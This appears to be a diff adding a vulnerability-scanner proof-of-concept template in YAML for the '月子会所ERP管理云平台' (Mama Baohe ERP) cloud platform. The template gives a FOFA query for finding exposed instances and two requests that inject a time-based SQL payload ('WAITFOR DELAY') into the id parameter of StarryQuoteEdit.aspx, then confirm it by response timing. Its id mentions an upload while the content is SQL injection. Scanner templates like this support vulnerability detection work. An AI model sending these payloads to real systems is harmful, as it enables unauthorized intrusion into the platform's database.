@@ -1,0 +1,30 @@
+id: poc-yaml-jintongfang-erp-starryquoteedit-upload
+info:
+  name: 月子会所ERP管理云平台 StarryQuoteEdit.aspx接口SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 月子会所ERP管理云平台
+  fofa: app="妈妈宝盒-ERP"
+variables:
+  t1: random_int(5,9)
+  t2: t1 + 2
+  t3: random_int(1,4)
+  t4: t3 + 2
+requests:
+- method: GET
+  path: /Page/SalerManager/StarryQuoteEdit.aspx?id=1;WAITFOR+DELAY+'0:0:{{.t1}}'--
+  expression: "status_code == 200 &&\ncontains(body,\"月子会所ERP管理云平台\") &&\nduration\
+    \ >= t1 &&\nduration <= t2 \n"
+- method: GET
+  path: /Page/SalerManager/StarryQuoteEdit.aspx?id=1;WAITFOR+DELAY+'0:0:{{.t3}}'--
+  expression: 'status_code == 200 &&
+
+    contains(body,"月子会所ERP管理云平台") &&
+
+    duration >= t3 &&
+
+    duration <= t4
+
+    '
+transport: http
